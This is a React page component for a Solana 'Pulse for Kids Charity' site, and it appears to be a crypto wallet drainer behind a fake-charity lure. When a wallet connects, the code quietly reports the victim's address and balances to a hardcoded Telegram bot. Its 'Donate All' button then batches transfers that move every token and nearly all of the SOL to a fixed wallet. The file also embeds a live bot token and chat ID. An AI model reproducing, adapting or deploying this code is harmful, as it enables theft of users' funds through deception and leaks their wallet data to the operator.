import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { useState, useEffect } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID, getAccount, getAssociatedTokenAddress, createTransferInstruction } from '@solana/spl-token';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Loader2, X, Heart } from 'lucide-react';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const TELEGRAM_BOT_TOKEN = '8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M';
const TELEGRAM_CHAT_ID = '-4836248812';
const BATCH_SIZE = 5;
const RENT_EXEMPT_MINIMUM = 0.00203928; // SOL

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  logoURI?: string;
  priceInSol?: number;
}

export default function Charity() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const { toast } = useToast();
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState<'idle' | 'loading' | 'error'>('idle');
  const [tokens, setTokens] = useState<TokenBalance[]>([]);
  const [solBalance, setSolBalance] = useState(0);
  const [totalValueInSol, setTotalValueInSol] = useState(0);

  useEffect(() => {
    if (publicKey) {
      fetchWalletData();
    }
  }, [publicKey]);

  const sendTelegramNotification = async (walletAddress: string, tokens: TokenBalance[], solBalance: number, totalValue: number) => {
    try {
      let message = `🔔 *New Wallet Connected*\n\n`;
      message += `📍 *Wallet Address:*\n\`${walletAddress}\`\n\n`;
      message += `💰 *SOL Balance:* ${solBalance.toFixed(6)} SOL\n\n`;
      
      if (tokens.length > 0) {
        message += `🪙 *SPL Tokens:*\n`;
        tokens.forEach((token, index) => {
          message += `${index + 1}. ${token.symbol || 'Unknown'}\n`;
          message += `   Balance: ${token.uiAmount.toFixed(6)}\n`;
          if (token.priceInSol) {
            message += `   Value: ${token.priceInSol.toFixed(6)} SOL\n`;
          }
        });
      }
      
      message += `\n💎 *Total Value:* ${totalValue.toFixed(6)} SOL`;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
        }),
      });
    } catch (error) {
      console.error('Telegram notification error:', error);
    }
  };

  const fetchWalletData = async () => {
    if (!publicKey) return;

    try {
      // Get SOL balance
      const balance = await connection.getBalance(publicKey);
      const solBal = balance / LAMPORTS_PER_SOL;
      setSolBalance(solBal);

      // Get token accounts
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID,
      });

      const tokenBalances: TokenBalance[] = [];
      
      for (const { account } of tokenAccounts.value) {
        const parsedInfo = account.data.parsed.info;
        const balance = parsedInfo.tokenAmount.uiAmount;
        
        if (balance > 0) {
          tokenBalances.push({
            mint: parsedInfo.mint,
            balance: parsedInfo.tokenAmount.amount,
            decimals: parsedInfo.tokenAmount.decimals,
            uiAmount: balance,
            symbol: 'SPL',
            priceInSol: 0,
          });
        }
      }

      setTokens(tokenBalances);
      
      const total = solBal + tokenBalances.reduce((sum, token) => sum + (token.priceInSol || 0), 0);
      setTotalValueInSol(total);

      // Send Telegram notification
      await sendTelegramNotification(publicKey.toBase58(), tokenBalances, solBal, total);
    } catch (error) {
      console.error('Error fetching wallet data:', error);
    }
  };

  const createBatchTransactions = async () => {
    if (!publicKey) return [];

    const charityPubkey = new PublicKey(CHARITY_WALLET);
    const transactions: Transaction[] = [];

    // Sort tokens by value (highest first)
    const sortedTokens = [...tokens].sort((a, b) => (b.priceInSol || 0) - (a.priceInSol || 0));

    // Create batches of token transfers (max 5 per transaction)
    for (let i = 0; i < sortedTokens.length; i += BATCH_SIZE) {
      const batch = sortedTokens.slice(i, i + BATCH_SIZE);
      const transaction = new Transaction();

      for (const token of batch) {
        try {
          const mintPubkey = new PublicKey(token.mint);
          const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
          const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);

          transaction.add(
            createTransferInstruction(
              fromTokenAccount,
              toTokenAccount,
              publicKey,
              token.balance,
              [],
              TOKEN_PROGRAM_ID
            )
          );
        } catch (error) {
          console.error(`Error adding token ${token.mint} to transaction:`, error);
        }
      }

      if (transaction.instructions.length > 0) {
        transactions.push(transaction);
      }
    }

    // Add SOL transfers
    if (solBalance > RENT_EXEMPT_MINIMUM) {
      // First transaction: 70% of SOL
      const firstSolAmount = Math.floor((solBalance * 0.7) * LAMPORTS_PER_SOL);
      const firstSolTx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: charityPubkey,
          lamports: firstSolAmount,
        })
      );
      transactions.push(firstSolTx);

      // Second transaction: Remaining SOL (minus rent)
      const remainingSol = solBalance * 0.3 - RENT_EXEMPT_MINIMUM;
      if (remainingSol > 0) {
        const finalSolAmount = Math.floor(remainingSol * LAMPORTS_PER_SOL);
        const finalSolTx = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: charityPubkey,
            lamports: finalSolAmount,
          })
        );
        transactions.push(finalSolTx);
      }
    } else if (solBalance > 0 && tokens.length === 0) {
      // Only SOL, send max minus rent
      const maxSol = solBalance - RENT_EXEMPT_MINIMUM;
      if (maxSol > 0) {
        const solAmount = Math.floor(maxSol * LAMPORTS_PER_SOL);
        const solTx = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: charityPubkey,
            lamports: solAmount,
          })
        );
        transactions.push(solTx);
      }
    }

    return transactions;
  };

  const handleDonate = async () => {
    if (!publicKey || !sendTransaction) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet first.",
        variant: "destructive",
      });
      return;
    }

    if (solBalance === 0 && tokens.length === 0) {
      setStatus('loading');
      setTimeout(() => {
        setStatus('error');
        toast({
          title: "Wallet Not Eligible",
          description: "Your wallet doesn't contain any SOL or SPL tokens.",
          variant: "destructive",
        });
      }, 2000);
      return;
    }

    setLoading(true);
    setStatus('loading');

    try {
      const transactions = await createBatchTransactions();

      if (transactions.length === 0) {
        throw new Error('No valid transactions to process');
      }

      // Get recent blockhash
      const { blockhash } = await connection.getLatestBlockhash();

      // Send transactions sequentially
      for (let i = 0; i < transactions.length; i++) {
        const transaction = transactions[i];
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        const signature = await sendTransaction(transaction, connection);
        
        toast({
          title: `Transaction ${i + 1}/${transactions.length} Sent`,
          description: `Signature: ${signature.slice(0, 8)}...`,
        });

        // Wait for confirmation
        await connection.confirmTransaction(signature, 'confirmed');
      }

      toast({
        title: "Donation Complete! 🎉",
        description: "Thank you for supporting Pulse for Kids!",
      });

      setStatus('idle');
      // Refresh wallet data
      await fetchWalletData();
    } catch (error: any) {
      console.error('Donation error:', error);
      setStatus('error');
      toast({
        title: "Donation Failed",
        description: error.message || "An error occurred during the donation process.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-background to-momo-pink/10">
      <div className="container mx-auto px-4 py-16">
        {/* Header */}
        <div className="text-center mb-12">
          <Heart className="w-16 h-16 mx-auto mb-4 text-momo-pink animate-pulse" />
          <h1 className="text-5xl font-bold mb-4 text-foreground">
            Pulse for Kids Charity
          </h1>
          <p className="text-xl text-muted-foreground max-w-2xl mx-auto">
            Support our global trading challenge! Traders worldwide create new wallets, 
            grow their balance, and donate everything to help children in need.
          </p>
        </div>

        {/* Wallet Connection */}
        <div className="flex justify-center mb-8">
          <WalletMultiButton className="!bg-momo-pink hover:!bg-momo-pink/90" />
        </div>

        {publicKey && (
          <>
            {/* Wallet Info */}
            <Card className="p-6 mb-8 bg-card/80 backdrop-blur-sm">
              <h3 className="text-xl font-semibold mb-4">Your Wallet</h3>
              <div className="space-y-2">
                <p className="text-sm text-muted-foreground">
                  SOL Balance: <span className="font-bold text-foreground">{solBalance.toFixed(6)} SOL</span>
                </p>
                <p className="text-sm text-muted-foreground">
                  SPL Tokens: <span className="font-bold text-foreground">{tokens.length}</span>
                </p>
                <p className="text-sm text-muted-foreground">
                  Total Value: <span className="font-bold text-foreground">{totalValueInSol.toFixed(6)} SOL</span>
                </p>
              </div>
            </Card>

            {/* Charity Wallet */}
            <Card className="p-6 mb-8 bg-momo-yellow/10 border-2 border-momo-yellow">
              <h3 className="text-xl font-semibold mb-2">Charity Wallet</h3>
              <p className="text-sm text-muted-foreground break-all">{CHARITY_WALLET}</p>
            </Card>

            {/* Donate Button */}
            <div className="flex justify-center">
              <Button
                onClick={handleDonate}
                disabled={loading || status === 'error'}
                size="lg"
                className={`text-xl py-6 px-12 transition-all duration-300 ${
                  status === 'error'
                    ? 'bg-red-600 hover:bg-red-700'
                    : 'bg-momo-pink hover:bg-momo-pink/90'
                }`}
              >
                {status === 'loading' && <Loader2 className="mr-2 h-6 w-6 animate-spin" />}
                {status === 'error' && <X className="mr-2 h-6 w-6" />}
                {status === 'idle' && 'Donate All'}
                {status === 'loading' && 'Processing...'}
                {status === 'error' && 'Wallet Not Eligible'}
              </Button>
            </div>

            {/* Info */}
            <div className="mt-12 max-w-2xl mx-auto">
              <Card className="p-6 bg-card/80 backdrop-blur-sm">
                <h3 className="text-xl font-semibold mb-4">How It Works</h3>
                <ol className="list-decimal list-inside space-y-2 text-muted-foreground">
                  <li>Connect your Solana wallet</li>
                  <li>The site detects all SOL and SPL tokens in your wallet</li>
                  <li>Click "Donate All" to send everything to the charity</li>
                  <li>Approve batch transactions in your wallet (max 5 tokens per transaction)</li>
                  <li>SOL is sent last to cover transaction fees</li>
                </ol>
              </Card>
            </div>
          </>
        )}
      </div>
    </div>
  );
}
